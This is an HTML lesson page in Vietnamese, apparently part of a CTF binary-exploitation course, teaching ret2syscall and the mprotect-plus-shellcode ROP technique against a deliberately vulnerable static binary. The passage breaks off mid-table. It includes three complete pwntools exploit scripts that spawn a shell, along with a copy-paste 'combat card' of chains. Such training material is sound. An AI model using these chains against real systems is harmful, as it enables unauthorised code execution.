@@ -1,0 +1,497 @@
+<title>ret2syscall & mprotect</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,5.5vw,44px);line-height:1.04;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.ropmap{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.rr{display:grid;grid-template-columns:150px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:7px 10px;background:var(--surface-2)}
+.rr .a{color:var(--mem);white-space:nowrap}
+.rr.g{background:var(--mem-soft);border-color:var(--mem)}.rr.call{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.pcalc{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.pcalc label{font-family:var(--font-mono);font-size:12px;color:var(--muted);display:block;margin:8px 0 4px}
+.pcalc input{font-family:var(--font-mono);font-size:14px;padding:7px 10px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);width:100%}
+.pcalc .out{margin-top:12px;font-family:var(--font-mono);font-size:13px;display:flex;flex-direction:column;gap:6px}
+.pcalc .ro{display:flex;justify-content:space-between;gap:10px;border:1px solid var(--line);border-radius:7px;padding:8px 11px;background:var(--surface)}
+.pcalc .ro b{color:var(--mem)}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 9</div>
+    <h1>ret2syscall &amp; mprotect</h1>
+    <p class="sub">Hai cách ROP "kết liễu": <strong>ret2syscall</strong> — gọi thẳng syscall <code>execve("/bin/sh")</code> khỏi cần libc leak; và <strong>mprotect</strong> — biến một trang nhớ thành <mark>RWX</mark> rồi nhảy vào shellcode ta đã ghi. Bài này đi <strong>chuỗi mprotect(page, 0x1000, 7) số thật</strong> rồi jump shellcode.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung–Cao (Phase 2)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 static, NX, no-PIE</span>
+      <span class="chip"><b>Cần trước:</b> <a href="rop_basics.html" style="color:inherit">rop_basics</a>, <a href="ret2csu.html" style="color:inherit">ret2csu</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Syscall</a><a href="#s4">04 mprotect</a><a href="#s5">05 Máy tính</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>ret2syscall:</strong> không cần libc — dùng gadget trong binary để đặt <code>rax=59, rdi=&amp;"/bin/sh", rsi=rdx=0</code> rồi <code>syscall</code> → <code>execve</code>. Hợp với binary <strong>static</strong> (nhiều gadget, không có libc để ret2libc).</p>
+    <p><strong>mprotect:</strong> gọi <code>mprotect(page, 0x1000, 7)</code> (7 = PROT_READ|WRITE|EXEC) để biến trang chứa buffer/bss thành <mark>RWX</mark>, rồi <code>jmp</code> vào shellcode ta đã nhập → vượt NX mà vẫn chạy shellcode.</p>
+    <p><strong>Chọn:</strong> có "/bin/sh" &amp; đủ gadget → ret2syscall gọn hơn. Cần shellcode phức tạp (ORW, seccomp) → mprotect + shellcode.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>mprotect(page&amp;~0xfff, 0x1000, 7) rồi jmp shellcode; hoặc rax=59 + syscall cho execve.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔢 Số syscall (x86-64)</span>
+<pre><code>execve=59  mprotect=10  read=0  write=1  mmap=9
+<span class="c"># mprotect(addr, len, prot): rdi=addr rsi=len rdx=prot</span>
+<span class="c"># prot: R=1 W=2 X=4 → RWX = 7</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🧩 Chuỗi mprotect + shellcode</span>
+<pre><code>1. read(0, bss, len)        <span class="c"># nhập shellcode vào bss</span>
+2. mprotect(bss&amp;~0xfff, 0x1000, 7)  <span class="c"># trang chứa bss → RWX</span>
+3. jmp bss                  <span class="c"># chạy shellcode</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Căn trang (bẫy #1)</span>
+        <p>mprotect yêu cầu <code>addr</code> <b>căn 0x1000</b> (đầu trang). Dùng <code>bss &amp; ~0xfff</code>. Nếu không căn → <code>EINVAL</code> (rax=-22).</p></div>
+      <div class="combat-row"><span class="lab">⚡ pwntools</span>
+<pre><code>r = ROP(exe)
+r.read(0, bss, 0x100)
+r.mprotect(bss &amp; ~0xfff, 0x1000, 7)
+r.raw(bss)                  <span class="c"># jmp vào shellcode</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 ret2syscall execve</span>
+<pre><code>pop rax;ret→59; pop rdi;ret→binsh; pop rsi;ret→0; pop rdx;ret→0; syscall</code></pre></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Syscall &amp; quyền trang nhớ</h2>
+  <p>Một <span class="mem-term">syscall</span> là cách chương trình nhờ kernel làm việc (mở file, cấp quyền, chạy chương trình). x86-64: đặt số syscall vào <code>rax</code>, đối số vào <code>rdi,rsi,rdx,r10,r8,r9</code>, rồi lệnh <code>syscall</code>. <span class="mem-term">mprotect</span> là syscall đổi <strong>quyền</strong> (đọc/ghi/thực thi) của một vùng nhớ — ta dùng nó để bật bit thực thi (X), vô hiệu NX trên vùng đó.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">ret2syscall</div><p>ROP gọi thẳng syscall (không cần libc).</p></div>
+    <div class="card"><div class="term">mprotect</div><p>syscall đổi quyền vùng nhớ (nr=10).</p></div>
+    <div class="card"><div class="term">RWX / prot=7</div><p>Read|Write|Exec — vùng thực thi được.</p></div>
+    <div class="card"><div class="term">page align</div><p>Căn 0x1000 (đầu trang).</p></div>
+    <div class="card"><div class="term">NX</div><p>Cờ cấm thực thi vùng data.</p></div>
+    <div class="card"><div class="term">static binary</div><p>Nhúng cả libc → nhiều gadget.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Hai lối thoát khi NX nhưng không ret2libc được</h2>
+  <p>Binary <strong>static</strong> không link libc động → không có GOT libc để leak theo kiểu <a href="ret2libc.html">ret2libc</a>. Nhưng nó <em>chứa</em> rất nhiều gadget &amp; cả syscall. ret2syscall tận dụng điều đó: gọi execve trực tiếp. Còn khi cần chạy <strong>shellcode tùy ý</strong> (vd ORW đọc flag khi có seccomp cấm execve), mprotect cho ta một vùng RWX để nhảy vào. Hai kỹ thuật này là "đòn kết" phổ biến của Phase 2.</p>
+ </div>
+</section>
+
+<!-- 03 Syscall -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / RET2SYSCALL · MỤC LÕI</div>
+  <h2>execve("/bin/sh") bằng syscall</h2>
+  <div class="ropmap">
+    <div class="rr g"><span class="a">0x44db34</span><span>pop rax; ret</span></div>
+    <div class="rr"><span class="a">59</span><span>SYS_execve → rax</span></div>
+    <div class="rr g"><span class="a">0x401263</span><span>pop rdi; ret</span></div>
+    <div class="rr"><span class="a">0x4c0f43</span><span>&amp;"/bin/sh" (static) → rdi</span></div>
+    <div class="rr g"><span class="a">0x40955e</span><span>pop rsi; ret</span></div>
+    <div class="rr"><span class="a">0</span><span>argv=NULL → rsi</span></div>
+    <div class="rr g"><span class="a">0x4017cf</span><span>pop rdx; ret</span></div>
+    <div class="rr"><span class="a">0</span><span>envp=NULL → rdx</span></div>
+    <div class="rr call"><span class="a">0x40137c</span><span>syscall → execve("/bin/sh",0,0)</span></div>
+  </div>
+  <div class="note tip"><span class="tag">Giống rop_basics</span>ret2syscall thực chất là chuỗi ROP ở <a href="rop_basics.html">rop_basics §03</a> — tên gọi nhấn mạnh "dùng syscall thay vì gọi hàm libc". Static binary luôn có <code>syscall; ret</code> gadget.</div>
+ </div>
+</section>
+
+<!-- 04 mprotect -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / MPROTECT + SHELLCODE</div>
+  <h2>Biến bss thành RWX rồi nhảy vào</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 620 120" role="img" aria-label="read ghi shellcode vào bss, mprotect bật X cho trang, jmp bss chạy shellcode" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <rect x="20" y="40" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <text x="95" y="60" text-anchor="middle" font-size="11" fill="currentColor" stroke="none" font-family="monospace">read(0,bss,len)</text>
+    <text x="95" y="76" text-anchor="middle" font-size="10" fill="var(--mem)" stroke="none" font-family="monospace">nhập shellcode</text>
+    <rect x="235" y="40" width="160" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="315" y="60" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">mprotect(page,</text>
+    <text x="315" y="76" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">0x1000, 7) → RWX</text>
+    <rect x="460" y="40" width="140" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="530" y="64" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">jmp bss → chạy SC</text>
+    <line x1="170" y1="63" x2="233" y2="63" stroke-width="1.4"/>
+    <line x1="395" y1="63" x2="458" y2="63" stroke="#e8663e" stroke-width="1.5"/>
+    <text x="310" y="108" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">NX chặn thực thi bss → mprotect bật X → nhảy vào shellcode đã ghi.</text>
+  </svg>
+  <figcaption>mprotect vô hiệu NX trên một trang; shellcode đó giờ chạy được.</figcaption>
+  </figure>
+  <h3>Bố cục stack: 3 giai đoạn (số thật)</h3>
+  <div class="ropmap">
+    <div class="rr" style="opacity:.75"><span class="a">—</span><span>Giai đoạn 1: read(0, 0x4c5000, 0x100) — csu/gadget (xem ret2csu nếu thiếu pop rdx)</span></div>
+    <div class="rr" style="opacity:.75"><span class="a">—</span><span>Giai đoạn 2: mprotect(0x4c5000, 0x1000, 7)</span></div>
+    <div class="rr call"><span class="a">0x4c5000</span><span>Giai đoạn 3: địa chỉ bss = jmp vào shellcode vừa nhập</span></div>
+  </div>
+  <div class="note warn"><span class="tag">Căn trang</span><code>mprotect</code> đòi <code>addr</code> căn <code>0x1000</code>. bss thường không căn → dùng <code>bss &amp; ~0xfff</code> (đầu trang). Nhập shellcode vào đúng offset trong trang đó &amp; nhảy tới đó.</div>
+ </div>
+</section>
+
+<!-- 05 Máy tính -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Máy tính căn trang &amp; prot</h2>
+  <p>Nhập địa chỉ bss → ra địa chỉ căn trang cho mprotect; chọn quyền → ra số prot.</p>
+  <div class="lab">
+    <div class="pcalc">
+      <label>Địa chỉ bss/buffer:</label>
+      <input id="aIn" value="0x4c5060" autocomplete="off">
+      <label style="margin-top:8px">Quyền:</label>
+      <div style="display:flex;gap:12px;font-family:var(--font-mono);font-size:13px;margin-top:4px">
+        <label style="margin:0"><input type="checkbox" id="pR" checked> R(1)</label>
+        <label style="margin:0"><input type="checkbox" id="pW" checked> W(2)</label>
+        <label style="margin:0"><input type="checkbox" id="pX" checked> X(4)</label>
+      </div>
+      <div class="out" id="pOut"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Gadget, bss, syscall</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Gadget pop + syscall</h4>
+    <pre><code><span class="p">$</span> ROPgadget --binary ./a | grep -E "pop (rax|rdi|rsi|rdx) ; ret|syscall"</code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>bss &amp; căn trang</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> bss = exe.bss()
+<span class="p">&gt;&gt;&gt;</span> page = bss &amp; ~<span class="d">0xfff</span>     <span class="c"># đầu trang cho mprotect</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Shellcode</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> context.arch = <span class="s">"amd64"</span>
+<span class="p">&gt;&gt;&gt;</span> sc = asm(shellcraft.sh())   <span class="c"># hoặc shellcraft.cat("/flag")</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>mprotect → shellcode (static, NX)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -static -fno-stack-protector -no-pie</span>
+<span class="k">int</span> main(){ <span class="k">char</span> b[<span class="d">0x40</span>]; read(<span class="d">0</span>, b, <span class="d">0x200</span>); }</code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools ROP</button>
+    <button class="tab" data-t="c">C · ret2syscall</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — read vào bss, mprotect trang RWX, jmp shellcode. Số thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>
+pop_rax=<span class="d">0x44db34</span>; pop_rdi=<span class="d">0x401263</span>; pop_rsi=<span class="d">0x40955e</span>
+pop_rdx=<span class="d">0x4017cf</span>; syscall=<span class="d">0x40137c</span>
+bss  = exe.bss(<span class="d">0x200</span>)          <span class="c"># vd 0x4c5060</span>
+page = bss &amp; ~<span class="d">0xfff</span>              <span class="c"># 0x4c5000 (căn trang)</span>
+
+<span class="k">def</span> sysc(nr, a, b_, c):
+    <span class="k">return</span> flat(pop_rax,nr, pop_rdi,a, pop_rsi,b_, pop_rdx,c, syscall)
+
+chain  = b<span class="s">"A"</span>*OFF
+chain += sysc(<span class="d">0</span>, <span class="d">0</span>, bss, <span class="d">0x100</span>)       <span class="c"># read(0, bss, 0x100)</span>
+chain += sysc(<span class="d">10</span>, page, <span class="d">0x1000</span>, <span class="d">7</span>)   <span class="c"># mprotect(page, 0x1000, RWX)</span>
+chain += p64(bss)                      <span class="c"># jmp vào shellcode (sẽ nhập ở bss)</span>
+p.send(chain)
+
+<span class="c"># gửi shellcode — nằm đúng tại bss, nhảy tới</span>
+p.send(asm(shellcraft.sh()))
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Gadget &amp; <code>bss=0x4c5060</code> là của binary static mẫu — <code>ROPgadget</code>/<code>exe.bss()</code>. Nếu thiếu <code>pop rdx</code> → dùng <a href="ret2csu.html">ret2csu</a> cho read/mprotect. Shellcode phải nằm đúng địa chỉ bạn jmp tới (bss, không phải page nếu bss≠page-start).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools ROP tự dựng (dùng csu nếu thiếu pop rdx).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+OFF = <span class="d">72</span>; bss = exe.bss(<span class="d">0x200</span>); page = bss &amp; ~<span class="d">0xfff</span>
+
+r = ROP(exe)
+r.read(<span class="d">0</span>, bss, <span class="d">0x100</span>)
+r.mprotect(page, <span class="d">0x1000</span>, <span class="d">7</span>)
+r.raw(bss)                  <span class="c"># jmp shellcode</span>
+p.send(b<span class="s">"A"</span>*OFF + r.chain())
+p.send(asm(shellcraft.sh()))
+p.interactive()
+log.info(r.dump())</code></pre>
+<div class="note tip"><span class="tag">ROP tự động</span><code>ROP(exe).read/.mprotect</code> tự chọn gadget, tự chèn ret2csu khi thiếu pop rdx. <code>r.dump()</code> xem bố cục. Cực nhanh trong thực chiến.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — ret2syscall execve (không cần shellcode, nếu có "/bin/sh").</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+OFF = <span class="d">72</span>
+pop_rax=<span class="d">0x44db34</span>; pop_rdi=<span class="d">0x401263</span>; pop_rsi=<span class="d">0x40955e</span>
+pop_rdx=<span class="d">0x4017cf</span>; syscall=<span class="d">0x40137c</span>
+binsh = <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))
+chain  = b<span class="s">"A"</span>*OFF
+chain += flat(pop_rax,<span class="d">59</span>, pop_rdi,binsh, pop_rsi,<span class="d">0</span>, pop_rdx,<span class="d">0</span>, syscall)
+p.send(chain); p.interactive()</code></pre>
+<div class="note"><span class="tag">So sánh</span>ret2syscall gọn hơn (1 chuỗi, không cần nhập shellcode) — dùng khi có "/bin/sh" &amp; đủ gadget. mprotect khi cần shellcode tùy ý (ORW/seccomp).</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>mprotect trả -22 (EINVAL)</h4><p>addr không căn 0x1000. Dùng page = bss & ~0xfff.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>jmp vào rác</h4><p>Shellcode nằm sai địa chỉ. jmp đúng nơi bạn read vào (bss, không phải page).</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Thiếu pop rdx</h4><p>Dùng ret2csu cho read/mprotect.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ROPgadget</div><h4>Gadget + syscall</h4><p>pop rax/rdi/rsi/rdx, syscall.</p></div>
+    <div class="card"><div class="term">pwntools ROP</div><h4>mprotect/read</h4><p><code>r.mprotect()</code>, auto csu.</p></div>
+    <div class="card"><div class="term">shellcraft</div><h4>Shellcode</h4><p><code>sh()</code>, <code>cat("/flag")</code>.</p></div>
+    <div class="card"><div class="term">vmmap (gdb)</div><h4>Xem quyền trang</h4><p>Kiểm RWX sau mprotect.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi không ra shell</h2>
+  <div class="grid">
+    <div class="card"><h4>EINVAL (-22)</h4><p>addr không căn trang. bss & ~0xfff.</p></div>
+    <div class="card"><h4>jmp crash</h4><p>Shellcode sai địa chỉ / chưa nhập xong. Đồng bộ read.</p></div>
+    <div class="card"><h4>Thiếu pop rdx</h4><p>ret2csu set rdx.</p></div>
+    <div class="card"><h4>Shellcode có null bị cắt</h4><p>Nếu read thì OK (nhận mọi byte); scanf %s thì không.</p></div>
+    <div class="card"><h4>PIE bật</h4><p>page = (bss+base) & ~0xfff. Leak base trước.</p></div>
+    <div class="card"><h4>seccomp cấm mprotect</h4><p>Một số đề cấm mprotect → chỉ còn ret2syscall ORW (xem seccomp_orw).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ</div>
+  <h2>Chọn đòn kết theo tình huống</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Tình huống</th><th>Đòn kết</th></tr></thead>
+    <tbody>
+      <tr><td>Static, có "/bin/sh", đủ gadget</td><td><b>ret2syscall execve</b> (gọn nhất)</td></tr>
